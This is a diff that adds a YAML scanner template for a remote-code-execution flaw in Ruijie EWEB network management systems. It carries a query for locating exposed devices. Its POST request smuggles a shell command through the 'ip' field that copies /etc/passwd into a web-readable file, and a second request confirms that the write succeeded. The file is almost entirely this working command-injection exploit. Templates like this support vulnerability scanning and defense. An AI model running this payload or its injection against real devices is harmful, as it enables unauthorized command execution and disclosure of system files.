@@ -1,0 +1,29 @@
+name: Ruijie Networks EWEB Network Management System RCE CNVD-2021-09650
+manual: true
+query: app="Ruijie-EG" || title="锐捷网络-EWEB网管系统" || app="Ruijie--EWEB"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /guest_auth/guestIsUp.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: mac=1&ip=127.0.0.1|cat /etc/passwd > test.txt
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /guest_auth/guestIsUp.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+    expression: response.status != 404 && !response.body.bcontains(b"File not found.")
+      && !response.body.bcontains(b"&gt;__&lt;") && response.status == 200
+expression: r0() && r1()
+detail:
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-09650
+  description: Ruijie Networks Co., Ltd. is a provider of ICT infrastructure and industry
+    solutions. Its main business is R&D, design and sales of network equipment, network
+    security products and cloud desktop solutions.
+  tags: rce
